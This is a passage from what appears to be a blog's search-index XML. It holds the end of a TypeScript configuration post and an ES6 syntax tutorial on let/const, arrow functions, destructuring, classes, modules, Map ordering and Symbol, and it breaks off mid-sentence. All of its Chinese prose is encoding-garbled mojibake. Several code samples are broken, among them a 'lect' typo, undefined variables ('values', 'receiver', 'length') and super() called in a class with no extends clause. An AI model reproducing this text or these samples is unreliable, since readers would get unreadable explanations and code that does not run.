class="string">"./src/**/*"</span>],</span><br><span class="line">  <span class="string">"exclude"</span>: [<span class="string">"**/*.spec.ts"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="7-tsc-å‘½ä»¤è¡Œç¼–è¯‘å™¨"><a href="#7-tsc-å‘½ä»¤è¡Œç¼–è¯‘å™¨" class="headerlink" title="7. tsc å‘½ä»¤è¡Œç¼–è¯‘å™¨"></a>7. tsc å‘½ä»¤è¡Œç¼–è¯‘å™¨</h3><p>tsc æ˜¯ TypeScript å®˜æ–¹çš„å‘½ä»¤è¡Œç¼–è¯‘å™¨ï¼Œç”¨æ¥æ£€æŸ¥ä»£ç ï¼Œå¹¶å°†å…¶ç¼–è¯‘æˆ JavaScript ä»£ç ã€‚</p><p>tsc é»˜è®¤ä½¿ç”¨å½“å‰ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶tsconfig.jsonï¼Œä½†ä¹Ÿå¯ä»¥æ¥å—ç‹¬ç«‹çš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://wangdoc.com/typescript/declare" target="_blank" rel="noopener">é˜®ä¸€å³° - typescriptæ•™ç¨‹</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ES6è¯­æ³•</title>
      <link href="/2020/10/15/ES6/"/>
      <url>/2020/10/15/ES6/</url>
      <content type="html"><![CDATA[<h3 id="1-let-constï¼Œå—çº§ä½œç”¨åŸŸ"><a href="#1-let-constï¼Œå—çº§ä½œç”¨åŸŸ" class="headerlink" title="1. let, constï¼Œå—çº§ä½œç”¨åŸŸ"></a>1. let, constï¼Œå—çº§ä½œç”¨åŸŸ</h3><ul><li><em>å—çº§ä½œç”¨åŸŸ</em><br>å£°æ˜åœ¨æŒ‡å®šå—çš„ä½œç”¨åŸŸä¹‹å¤–æ— æ³•è®¿é—®çš„å˜é‡ã€‚å­˜åœ¨äºå‡½æ•°å†…éƒ¨å’Œå—<code>{}</code>ä¸­ã€‚ä¸€æ—¦æ‰§è¡Œåˆ°å—å¤–ä¼šç«‹å³é”€æ¯ã€‚<br>ï¼ˆä¸ºä»€ä¹ˆéœ€è¦å—çº§ä½œç”¨åŸŸï¼Ÿ1. é¿å…å†…å±‚å˜é‡è¦†ç›–å¤–å±‚å˜é‡ï¼›2.é¿å…ç”¨äºè®¡æ•°çš„å¾ªç¯å˜é‡æ³„éœ²ä¸ºå…¨å±€å˜é‡ï¼‰</li></ul><ul><li><p>var<br>å…¶ä½œç”¨åŸŸä¸ºè¯¥è¯­å¥æ‰€åœ¨çš„å‡½æ•°å†…ï¼Œä¸”å­˜åœ¨å˜é‡æå‡ç°è±¡</p></li><li><p>let<br>å…¶ä½œç”¨åŸŸä¸ºè¯¥è¯­å¥æ‰€åœ¨çš„ä»£ç å—å†…ï¼Œä¸å­˜åœ¨å˜é‡æå‡ï¼›<br>æš‚æ—¶æ€§æ­»åŒºï¼šåªè¦å—çº§ä½œç”¨äºå†…å­˜åœ¨<code>let</code>ï¼Œå°±ä¸å†å—å¤–éƒ¨ç¯å¢ƒå½±å“</p></li><li><p>const<br>åœ¨åé¢å‡ºç°çš„ä»£ç ä¸­ä¸èƒ½å†ä¿®æ”¹è¯¥å¸¸é‡çš„å€¼ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œconst é‡Œé¢åªå­˜äº†ä¸€ä¸ªå€¼ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªåœ°å€(object)ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå€¼(string/number/..)ã€‚å½“ const å®šä¹‰çš„æ˜¯åœ°å€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®é™…æŒ‡å‘çš„ object çš„å†…å®¹ï¼Œä½†æ˜¯ä¸å¯ä»¥ä¿®æ”¹è¿™ä¸ªæŒ‡å‘åœ°å€ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;;</span><br><span class="line">obj.a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj); <span class="comment">// &#123; a: 2 &#125;</span></span><br><span class="line">obj = &#123; <span class="attr">a</span>: <span class="number">2</span> &#125;; <span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-æ¨¡æ¿å­—é¢é‡"><a href="#2-æ¨¡æ¿å­—é¢é‡" class="headerlink" title="2. æ¨¡æ¿å­—é¢é‡(``)"></a>2. æ¨¡æ¿å­—é¢é‡(``)</h3><p>å®ç°äº†å¤šè¡Œå­—ç¬¦ä¸²ï¼Œå°†å˜é‡çš„å€¼åµŒå…¥å­—ç¬¦ä¸²ï¼ŒHTML è½¬ä¹‰(å‘ HTML æ’å…¥ç»è¿‡å®‰å…¨è½¬æ¢åçš„å­—ç¬¦ä¸²)çš„èƒ½åŠ›</p><ul><li>åœ¨åæ’‡å·ä¸­æ‰€æœ‰ç©ºç™½ç¬¦éƒ½å±äºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†.ä½ å¯ä»¥æ˜¾ç¤ºåœ°ä½¿ç”¨<code>\n</code>æ¥æŒ‡æ˜æ¢è¡Œã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">`hello</span></span><br><span class="line"><span class="string">  world`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.length); <span class="comment">// 16</span></span><br></pre></td></tr></table></figure><ul><li>å ä½ç¬¦<code>${}</code> ä¸­å¯ä»¥åŒ…å« Javascript è¡¨è¾¾å¼</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">`hello, <span class="subst">$&#123;count&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">`hello, <span class="subst">$&#123;(count * <span class="number">2</span>).toFixed(<span class="number">2</span>)&#125;</span>`</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-å‡½æ•°"><a href="#3-å‡½æ•°" class="headerlink" title="3. å‡½æ•°"></a>3. å‡½æ•°</h3><h4 id="3-1-é»˜è®¤å‚æ•°"><a href="#3-1-é»˜è®¤å‚æ•°" class="headerlink" title="3.1 é»˜è®¤å‚æ•°"></a>3.1 é»˜è®¤å‚æ•°</h4><p>è®¾ç½®å‚æ•°é»˜è®¤å€¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">num = getValue(</span>), <span class="title">callback</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;&#125;) &#123;&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-2-ä¸å®šå‚æ•°-â€¦"><a href="#3-2-ä¸å®šå‚æ•°-â€¦" class="headerlink" title="3.2 ä¸å®šå‚æ•°(â€¦)"></a>3.2 ä¸å®šå‚æ•°(â€¦)</h4><p>ä½¿ç”¨é™åˆ¶ï¼šæ¯ä¸ªå‡½æ•°åªèƒ½å£°æ˜ä¸€ä¸ªä¸å®šæ•°é‡çš„å‚æ•°ï¼Œä¸”ä¸€å®šè¦æ”¾åœ¨æ‰€æœ‰å‚æ•°çš„æœ«å°¾<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkArgs</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(args.length); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line">checkArgs(<span class="string">'a'</span>, <span class="string">'b'</span>);</span><br></pre></td></tr></table></figure></p><h4 id="3-3-å±•å¼€è¿ç®—ç¬¦-â€¦"><a href="#3-3-å±•å¼€è¿ç®—ç¬¦-â€¦" class="headerlink" title="3.3 å±•å¼€è¿ç®—ç¬¦(â€¦)"></a>3.3 å±•å¼€è¿ç®—ç¬¦(â€¦)</h4><p>ä½¿ç”¨â€¦çš„æ¡ä»¶æ˜¯å¯æšä¸¾<br>å±•å¼€è¿ç®—ç¬¦å¯ä»¥è®©ä½ æŒ‡å®šä¸€ä¸ªæ•°ç»„ï¼Œå°†å®ƒä»¬æ‰“æ•£åä½œä¸ºç‹¬ç«‹çš„å‚æ•°ä¼ å…¥å‡½æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max(...values)); <span class="comment">// ç­‰ä»·äºconsole.log(Math.max(1,2,3,4))</span></span><br></pre></td></tr></table></figure></p><h4 id="3-4-ç®­å¤´å‡½æ•°-gt"><a href="#3-4-ç®­å¤´å‡½æ•°-gt" class="headerlink" title="3.4 ç®­å¤´å‡½æ•°(=&gt;)"></a>3.4 ç®­å¤´å‡½æ•°(=&gt;)</h4><p>ç®­å¤´å‡½æ•°æ˜¯ä¸€ç§ä½¿ç”¨ç®­å¤´(=&gt;)å®šä¹‰å‡½æ•°çš„æ–°è¯­æ³•</p><ul><li>ç®­å¤´å‡½æ•°ä¸­çš„<code>this, super, arguments, new.target</code>çš„å€¼ç”±å¤–å›´æœ€è¿‘ä¸€å±‚éç®­å¤´å‡½æ•°å†³å®š</li><li>ç®­å¤´å‡½æ•°ä¸èƒ½è¢«ç”¨ä½œæ„é€ å‡½æ•°ï¼Œä¸èƒ½é€šè¿‡<code>new</code>è°ƒç”¨</li><li>æ²¡æœ‰åŸå‹ï¼Œä¸å­˜åœ¨<code>prototype</code>è¿™ä¸ªå±æ€§</li><li>å‡½æ•°å†…éƒ¨çš„<code>this</code>å€¼ä¸å¯è¢«æ”¹å˜</li><li>ä¸æ”¯æŒ<code>arguments</code>å¯¹è±¡</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="params">()</span> =&gt;</span> <span class="string">'Nicholas'</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">lect c = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> d = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">'Temp'</span>&#125;) <span class="comment">// è®©ç®­å¤´å‘å¤–è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œåº”åŒ…è£¹åœ¨å°æ‹¬å·é‡Œ</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-å¯¹è±¡"><a href="#4-å¯¹è±¡" class="headerlink" title="4. å¯¹è±¡"></a>4. å¯¹è±¡</h3><h4 id="4-1-ç®€å†™ã€å¯è®¡ç®—çš„å±æ€§å"><a href="#4-1-ç®€å†™ã€å¯è®¡ç®—çš„å±æ€§å" class="headerlink" title="4.1 ç®€å†™ã€å¯è®¡ç®—çš„å±æ€§å"></a>4.1 ç®€å†™ã€å¯è®¡ç®—çš„å±æ€§å</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> suffix = <span class="string">'name'</span>;</span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name,</span><br><span class="line">  [<span class="string">'first'</span> + suffix]: <span class="string">'Zakas'</span>,</span><br><span class="line">  sayName() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="4-2-Object-assign"><a href="#4-2-Object-assign" class="headerlink" title="4.2 Object.assign"></a>4.2 Object.assign</h4><p>å®ç°ä¸€ä¸ªæµ…æ‹·è´ï¼Œæ¥å—æºå¯¹è±¡ï¼Œå¹¶æŒ‰æŒ‡å®šçš„é¡ºåºå°†å±æ€§å¤åˆ¶åˆ°æ¥æ”¶å¯¹è±¡ä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(&#123;&#125;, &#123; <span class="attr">type</span>: <span class="string">'js'</span>, <span class="attr">name</span>: <span class="string">'file.js'</span> &#125;, &#123; <span class="attr">type</span>: <span class="string">'css'</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(receiver.type); <span class="comment">// 'css'</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-è§£æ„èµ‹å€¼"><a href="#5-è§£æ„èµ‹å€¼" class="headerlink" title="5. è§£æ„èµ‹å€¼"></a>5. è§£æ„èµ‹å€¼</h3><p>â€œæ¨¡å¼åŒ¹é…â€çš„å†™æ³•ï¼Œåªè¦ç­‰å·ä¸¤è¾¹çš„æ¨¡å¼ç›¸åŒï¼Œå·¦è¾¹çš„å˜é‡å°±ä¼šè¢«èµ‹äºˆå¯¹åº”çš„å€¼ã€‚</p><ul><li><p>å¯¹è±¡è§£æ„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> node = &#123; <span class="attr">type</span>: <span class="string">'Identifier'</span>, <span class="attr">name</span>: <span class="string">'foo'</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; type, name &#125; = node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡å‘½åè§£æ„å‡ºæ¥çš„å˜é‡å</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">type</span>: localType, <span class="attr">name</span>: localName &#125; = node;</span><br><span class="line"><span class="built_in">console</span>.log(localType); <span class="comment">// 'Identifier'</span></span><br></pre></td></tr></table></figure></li><li><p>æ•°ç»„è§£æ„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>];</span><br><span class="line"><span class="keyword">let</span> [firstColor, secondColor] = colors;</span><br><span class="line"><span class="built_in">console</span>.log(firstColor); <span class="comment">// "red"</span></span><br></pre></td></tr></table></figure></li><li><p>å­—ç¬¦ä¸²è§£æ„<br>äº‹å®ä¸Šï¼Œåªè¦æŸç§æ•°æ®ç»“æ„å…·æœ‰ Iterator æ¥å£ï¼Œéƒ½å¯ä»¥é‡‡ç”¨æ•°ç»„å½¢å¼çš„è§£æ„èµ‹å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, c, d, e] = <span class="string">'hello'</span>;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-Class"><a href="#6-Class" class="headerlink" title="6. Class"></a>6. Class</h3><p>ES6 ä½¿ç”¨<code>class</code>ï¼Œå–ä»£éœ€è¦<code>prototype</code>çš„æ“ä½œã€‚ç”¨<code>constructor</code>æ–¹æ³•åæ¥å®šä¹‰æ„é€ å‡½æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(length, width) &#123;</span><br><span class="line">    <span class="keyword">super</span>(length, length);</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">  getArea() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.length * <span class="keyword">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-æ¨¡å—"><a href="#7-æ¨¡å—" class="headerlink" title="7. æ¨¡å—"></a>7. æ¨¡å—</h3><p>æ¨¡å—æ˜¯ä¸€ç§æ‰“åŒ…å’Œå°è£…åŠŸèƒ½çš„æ–¹å¼ï¼Œæ¨¡å—çš„è¡Œä¸ºä¸è„šæœ¬ä¸åŒï¼Œæ¨¡å—ä¸ä¼šå°†å®ƒçš„é¡¶çº§å˜é‡ã€å‡½æ•°å’Œç±»ä¿®æ”¹ä¸ºå…¨å±€ä½œç”¨åŸŸï¼Œè€Œä¸”<code>this</code>çš„å€¼ä¸º<code>undefined</code>ã€‚</p><h4 id="7-1-importã€export"><a href="#7-1-importã€export" class="headerlink" title="7.1 importã€export"></a>7.1 importã€export</h4><ul><li>import: ä»æ¨¡å—ä¸­exportçš„æ–¹æ³•ã€å˜é‡å¯ä»¥é€šè¿‡<code>import</code>åœ¨å¦ä¸€ä¸ªæ¨¡å—ä¸­è®¿é—®</li><li>export: å°†ä»£ç æš´éœ²ç»™å…¶ä»–æ¨¡å—<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">import</span> &#123; identifier1, identifier2 &#125; <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> example <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> color = <span class="string">'red'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å‡ºé»˜è®¤å€¼</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="7-2-lt-script-type-quot-module-quot-gt"><a href="#7-2-lt-script-type-quot-module-quot-gt" class="headerlink" title="7.2 &lt;script type=&quot;module&quot;&gt;"></a>7.2 <code>&lt;script type=&quot;module&quot;&gt;</code></h4><p>é€šè¿‡<code>&lt;script type=&quot;module&quot;&gt;</code>åŠ è½½çš„æ¨¡å—æ–‡ä»¶é»˜è®¤å…·æœ‰ defer å±æ€§ï¼Œåœ¨æ–‡æ¡£å®Œå…¨è¢«è§£æåï¼Œæ¨¡å—æŒ‰ç…§å®ƒä»¬åœ¨æ–‡æ¡£ä¸­å‡ºç°çš„é¡ºåºä¾æ¬¡æ‰§è¡Œã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"module.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; sum &#125; <span class="keyword">from</span> <span class="string">'./example.js'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> result = sum(<span class="number">1</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="8-Set-WeakSet-Map-WeakMapï¼Œ"><a href="#8-Set-WeakSet-Map-WeakMapï¼Œ" class="headerlink" title="8. Set, WeakSet, Map, WeakMapï¼Œ{}"></a>8. Set, WeakSet, Map, WeakMapï¼Œ{}</h3><h4 id="8-1-Set-è¿‡æ»¤é‡å¤å€¼"><a href="#8-1-Set-è¿‡æ»¤é‡å¤å€¼" class="headerlink" title="8.1 Set è¿‡æ»¤é‡å¤å€¼"></a>8.1 Set è¿‡æ»¤é‡å¤å€¼</h4><p>å¯¹ä¸€ä¸ªæ•°ç»„ï¼Œè¿›è¡Œå¤åˆ¶å¹¶åˆ›å»ºä¸€ä¸ªæ— é‡å¤å…ƒç´ çš„æ–°æ•°ç»„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">array = [...set];</span><br><span class="line"><span class="built_in">console</span>.log(array); <span class="comment">// [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure><h4 id="8-2-Map-å’Œ-çš„åŒºåˆ«"><a href="#8-2-Map-å’Œ-çš„åŒºåˆ«" class="headerlink" title="8.2 Map å’Œ {} çš„åŒºåˆ«"></a>8.2 Map å’Œ {} çš„åŒºåˆ«</h4><p><code>{}</code>çš„keyåªèƒ½æ˜¯åŸºæœ¬ç±»å‹ï¼ŒMapçš„keyå¯ä»¥æ˜¯</p><ul><li>{} çš„keyæ˜¯å¦‚ä½•æ’åºçš„ï¼Ÿ<br>æ•°å­—å±æ€§è¢«æœ€å…ˆæ‰“å°å‡ºæ¥ï¼Œä¸”æ˜¯æŒ‰ç…§æ•°å­—å¤§å°çš„é¡ºåºæ‰“å°ï¼›å­—ç¬¦ä¸²å±æ€§æ˜¯æŒ‰ç…§è®¾ç½®é¡ºåºæ‰“å°çš„ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>[<span class="number">100</span>] = <span class="string">'test-100'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">1</span>] = <span class="string">'test-1'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"B"</span>] = <span class="string">'bar-B'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">50</span>] = <span class="string">'test-50'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">9</span>] =  <span class="string">'test-9'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">8</span>] = <span class="string">'test-8'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">3</span>] = <span class="string">'test-3'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">5</span>] = <span class="string">'test-5'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"A"</span>] = <span class="string">'bar-A'</span></span><br><span class="line">  <span class="keyword">this</span>[<span class="string">"C"</span>] = <span class="string">'bar-C'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> Foo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> bar)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`index:<span class="subst">$&#123;key&#125;</span>  value:<span class="subst">$&#123;bar[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">index:1  value:test-1</span></span><br><span class="line"><span class="comment">index:3  value:test-3</span></span><br><span class="line"><span class="comment">index:5  value:test-5</span></span><br><span class="line"><span class="comment">index:8  value:test-8</span></span><br><span class="line"><span class="comment">index:9  value:test-9</span></span><br><span class="line"><span class="comment">index:50  value:test-50</span></span><br><span class="line"><span class="comment">index:100  value:test-100</span></span><br><span class="line"><span class="comment">index:B  value:bar-B</span></span><br><span class="line"><span class="comment">index:A  value:bar-A</span></span><br><span class="line"><span class="comment">index:C  value:bar-C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¹‹æ‰€ä»¥å‡ºç°è¿™æ ·çš„ç»“æœï¼Œæ˜¯å› ä¸ºåœ¨ ECMAScript è§„èŒƒä¸­å®šä¹‰äº†<strong>æ•°å­—å±æ€§</strong>åº”è¯¥æŒ‰ç…§ç´¢å¼•å€¼å¤§å°å‡åºæ’åˆ—ï¼Œ<strong>å­—ç¬¦ä¸²å±æ€§</strong>æ ¹æ®åˆ›å»ºæ—¶çš„é¡ºåºå‡åºæ’åˆ—ã€‚</p><p>åœ¨ V8 å†…éƒ¨ï¼Œä¸ºäº†æœ‰æ•ˆåœ°æå‡å­˜å‚¨å’Œè®¿é—®è¿™ä¸¤ç§å±æ€§çš„æ€§èƒ½ï¼Œåˆ†åˆ«ä½¿ç”¨äº†ä¸¤ä¸ªçº¿æ€§æ•°æ®ç»“æ„æ¥åˆ†åˆ«ä¿å­˜<strong>æ•°å­—å±æ€§ element</strong>å’Œ<strong>å­—ç¬¦ä¸²å±æ€§ properties</strong>ã€‚</p><p><br></p><h3 id="9-Promise"><a href="#9-Promise" class="headerlink" title="9. Promise"></a>9. Promise</h3><p><br></p><h3 id="10-Symbol"><a href="#10-Symbol" class="headerlink" title="10. Symbol"></a>10. Symbol</h3><p>ES5 çš„å¯¹è±¡å±æ€§åéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œè¿™å®¹æ˜“é€ æˆå±æ€§åçš„å†²çªã€‚ES6 å¼•å…¥äº†ä¸€ç§æ–°çš„åŸå§‹æ•°æ®ç±»å‹Symbolï¼Œè¡¨ç¤ºç‹¬ä¸€æ— äºŒçš„å€¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="built_in">Symbol</span>(<span class="string">'foo'</span>);</span><br></pre></td></tr></table></figure></p><h3 id="11-Proxy-ä»£ç†"><a href="#11-Proxy-ä»£ç†" class="headerlink" title="11. Proxy ä»£ç†"></a>11. Proxy ä»£ç†</h3><p>Proxy å¯ä»¥ç†è§£æˆï¼Œåœ¨ç›®æ ‡å¯¹è±¡ä¹‹å‰æ¶è®¾ä¸€å±‚â€œæ‹¦æˆªâ€ï¼Œå¤–ç•Œå¯¹è¯¥å¯¹è±¡çš„è®¿é—®ï¼Œéƒ½å¿…é¡»å…ˆé€šè¿‡è¿™å±‚æ‹¦æˆªï¼Œå› 